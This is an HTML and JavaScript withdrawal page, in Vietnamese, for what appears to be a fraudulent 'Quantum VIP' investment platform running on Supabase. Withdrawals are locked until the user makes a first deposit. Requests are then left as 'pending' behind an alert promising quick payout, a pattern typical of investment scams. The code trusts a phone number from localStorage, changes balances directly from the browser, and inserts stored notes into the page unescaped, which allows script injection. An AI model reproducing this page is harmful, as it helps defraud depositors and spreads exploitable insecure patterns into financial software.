<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>RÚT VỐN QUANTUM | VIP</title>
    
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Inter:wght@300;400;600;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>

    <style>
        :root {
            --gold: #FFD700;
            --gold-gradient: linear-gradient(135deg, #bf953f 0%, #fcf6ba 45%, #b38728 50%, #fcf6ba 55%, #aa771c 100%);
            --bg: #000;
            --card: rgba(15, 15, 15, 0.95);
            --border: rgba(255, 215, 0, 0.2);
        }

        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body { background: var(--bg); color: #fff; font-family: 'Inter', sans-serif; min-height: 100vh; padding-bottom: 30px; }

        header { padding: 20px; display: flex; align-items: center; gap: 15px; border-bottom: 1px solid var(--border); background: rgba(0,0,0,0.8); position: sticky; top: 0; z-index: 100; }
        header h2 { font-family: 'Orbitron'; font-size: 15px; color: var(--gold); letter-spacing: 2px; }

        .container { padding: 20px; }

        .vip-card {
            background: var(--card); border-radius: 25px; border: 1px solid var(--border);
            padding: 25px; margin-bottom: 30px; box-shadow: 0 10px 40px rgba(0,0,0,1);
            animation: fadeInUp 0.5s;
        }

        .label { font-size: 10px; color: var(--gold); text-transform: uppercase; letter-spacing: 2px; margin-bottom: 15px; display: block; font-weight: 800; }

        .input-group { margin-bottom: 15px; }
        .input-group select, .input-group input {
            width: 100%; background: #0a0a0a; border: 1px solid #222; padding: 16px;
            border-radius: 15px; color: #fff; outline: none; font-size: 14px; transition: 0.3s;
        }
        .input-group input:focus { border-color: var(--gold); box-shadow: 0 0 15px rgba(255,215,0,0.1); }

        .btn-withdraw {
            width: 100%; padding: 18px; border-radius: 18px; border: none;
            background: var(--gold-gradient); color: #000; font-weight: 900;
            font-family: 'Orbitron'; cursor: pointer; text-transform: uppercase; font-size: 13px;
            box-shadow: 0 5px 20px rgba(255, 215, 0, 0.2); transition: 0.3s;
        }
        .btn-withdraw:disabled { background: #1a1a1a !important; color: #444 !important; cursor: not-allowed; box-shadow: none; }

        #lock-msg { background: rgba(255, 77, 77, 0.1); padding: 12px; border-radius: 10px; color: #ff4d4d; font-size: 11px; text-align: center; margin-top: 15px; display: none; }

        /* Lịch sử */
        .history-box { margin-top: 20px; }
        .history-list { background: #0a0a0a; border-radius: 20px; border: 1px solid #111; min-height: 100px; }
        .h-item { padding: 15px; border-bottom: 1px solid #111; display: flex; justify-content: space-between; align-items: center; }
        .h-item:last-child { border-bottom: none; }
        .h-info div:first-child { font-size: 13px; font-weight: 600; color: #fff; }
        .h-info div:last-child { font-size: 10px; color: #555; margin-top: 3px; }
        .h-status { text-align: right; }
        .h-status b { color: var(--gold); display: block; font-size: 14px; font-family: 'Orbitron'; }
        .h-status span { font-size: 10px; font-weight: 800; text-transform: uppercase; color: #888; }
    </style>
</head>
<body>

    <header>
        <a href="index.html" style="color:var(--gold)"><i class="fas fa-chevron-left"></i></a>
        <h2>RÚT VỐN ĐẦU TƯ</h2>
    </header>

    <div class="container">
        <div class="vip-card">
            <span class="label"><i class="fas fa-shield-alt"></i> Thông tin thụ hưởng</span>
            
            <div class="input-group">
                <select id="bank-name">
                    <option value="">-- CHỌN NGÂN HÀNG --</option>
                    <option value="Vietcombank">Vietcombank</option>
                    <option value="MB Bank">MB Bank</option>
                    <option value="Techcombank">Techcombank</option>
                    <option value="BIDV">BIDV</option>
                    <option value="Momo">Ví MoMo</option>
                </select>
            </div>

            <div class="input-group"><input type="text" id="bank-number" placeholder="SỐ TÀI KHOẢN"></div>
            <div class="input-group"><input type="text" id="bank-user" placeholder="HỌ VÀ TÊN CHỦ THẺ"></div>
            <div class="input-group"><input type="number" id="draw-amt" placeholder="SỐ TIỀN MUỐN RÚT"></div>

            <button class="btn-withdraw" id="btn-action" onclick="handleWithdraw()">XÁC NHẬN GỬI LỆNH</button>
            
            <div id="lock-msg">
                <i class="fas fa-lock"></i> Kích hoạt nạp đầu để sử dụng tính năng này.
            </div>
        </div>

        <div class="history-box">
            <span class="label">Lịch sử rút vốn</span>
            <div class="history-list" id="history-container">
                <div style="padding:30px; text-align:center; color:#333; font-size:12px;">Đang kiểm tra dữ liệu...</div>
            </div>
        </div>
    </div>

    <script type="module">
        import { createClient } from 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm'
        const supabase = createClient('https://fgartftwimourooudcrp.supabase.co', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImZnYXJ0ZnR3aW1vdXJvb3VkY3JwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzM2MjcwNjAsImV4cCI6MjA4OTIwMzA2MH0.OY9xaxGcir8U4BeoUDg1BOOeNTEM4LRhpftAZruBb8o');

        const phone = localStorage.getItem('user_session');
        let currentBalance = 0;

        async function init() {
            if(!phone) return;

            // 1. Lấy số dư và kiểm tra điều kiện mở nút
            const { data: user } = await supabase.from('users').select('balance').eq('phone', phone).single();
            if(user) currentBalance = user.balance;

            // Kiểm tra xem đã nạp thành công lần nào chưa
            const { data: checkDep } = await supabase.from('history')
                .select('id').eq('phone', phone).eq('type', 'Nạp tiền').eq('status', 'Thành công').limit(1);

            if(!checkDep || checkDep.length === 0) {
                document.getElementById('btn-action').disabled = true;
                document.getElementById('lock-msg').style.display = 'block';
            } else {
                document.getElementById('btn-action').disabled = false;
                document.getElementById('lock-msg').style.display = 'none';
            }

            // 2. Load lịch sử rút
            loadHistory();
        }

        async function loadHistory() {
            const { data: logs } = await supabase.from('history')
                .select('*').eq('phone', phone).eq('type', 'Rút tiền').order('created_at', {ascending: false});

            const container = document.getElementById('history-container');
            if(logs && logs.length > 0) {
                container.innerHTML = logs.map(l => `
                    <div class="h-item">
                        <div class="h-info">
                            <div>${l.note.split(' - ')[0]}</div>
                            <div>${new Date(l.created_at).toLocaleString()}</div>
                        </div>
                        <div class="h-status">
                            <b>-${l.amount.toLocaleString()}đ</b>
                            <span style="color: ${l.status === 'Thành công' ? '#00ff88' : 'var(--gold)'}">${l.status}</span>
                        </div>
                    </div>
                `).join('');
            } else {
                container.innerHTML = '<div style="padding:30px; text-align:center; color:#333; font-size:11px;">Chưa có lịch sử giao dịch</div>';
            }
        }

        window.handleWithdraw = async () => {
            const bank = document.getElementById('bank-name').value;
            const num = document.getElementById('bank-number').value;
            const user = document.getElementById('bank-user').value;
            const amt = parseInt(document.getElementById('draw-amt').value);

            if(!bank || !num || !user || isNaN(amt)) return alert("Vui lòng nhập đầy đủ!");
            if(amt < 100000) return alert("Tối thiểu rút 100,000đ");
            if(amt > currentBalance) return alert("Số dư khả dụng không đủ!");

            document.getElementById('btn-action').disabled = true;
            document.getElementById('btn-action').innerText = "ĐANG XỬ LÝ...";

            // Thực hiện trừ tiền và lưu lệnh chờ duyệt
            await supabase.from('users').update({ balance: currentBalance - amt }).eq('phone', phone);
            await supabase.from('history').insert([{
                phone: phone,
                type: 'Rút tiền',
                amount: amt,
                status: 'Chờ duyệt',
                note: `${bank} - ${num} - ${user}`
            }]);

            alert("✨ Lệnh rút thành công! Tiền sẽ về trong giây lát, vui lòng đợi hệ thống kiểm tra.");
            location.reload();
        }

        init();
    </script>
</body>
</html>
